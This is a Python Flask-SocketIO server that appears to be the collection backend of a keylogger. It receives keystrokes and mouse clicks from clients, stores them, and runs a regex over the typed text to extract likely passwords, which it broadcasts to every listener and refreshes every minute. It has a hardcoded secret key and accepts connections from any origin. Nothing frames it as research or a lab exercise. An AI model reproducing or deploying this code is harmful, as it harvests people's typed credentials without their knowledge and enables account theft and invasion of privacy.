
import time
import threading
from flask import Flask, jsonify
from flask_socketio import SocketIO, emit
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

data_store = {
    'keystrokes': [],
    'mouse_clicks': [],
    'predicted_passwords': []
}

@app.route('/test', methods=['GET'])
def test():
    return jsonify({"message": "Backend is running"})

@socketio.on('keystroke')
def handle_keystroke(data):
    data_store['keystrokes'].append(data['key'])
    predict_passwords()
    socketio.emit('keystroke_update', {'new_keystrokes': ''.join(data_store['keystrokes'])})

@socketio.on('mouse_click')
def handle_mouse_click(data):
    button = 'Left' if data['button'] == 0 else 'Right' if data['button'] == 2 else 'Middle'
    coords = f"({data['x']}, {data['y']})"
    click_info = f"{button} at {coords}"
    data_store['mouse_clicks'].append(click_info)
    socketio.emit('mouse_click_update', {'new_click': click_info})

def predict_passwords():
    keystrokes = ''.join(data_store['keystrokes'])
    # Regex for sequences with special characters and numbers
    raw_passwords = re.findall(r'\b\w*[@#$%^&*()_+=-]+\w*|\w*[0-9]+\w*', keystrokes)
    passwords = []
    for pw in raw_passwords:
        pw = pw.replace('Shift', '')
        if len(pw) > 16:
            pw = pw[:8] + pw[-8:]
        passwords.append(pw)
    data_store['predicted_passwords'] = passwords
    socketio.emit('password_prediction', {'predicted_passwords': passwords})

def periodic_update():
    while True:
        time.sleep(60)
        predict_passwords()

threading.Thread(target=periodic_update, daemon=True).start()

@socketio.on('connect')
def test_connect():
    emit('my_response', {'data': 'Connected'})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
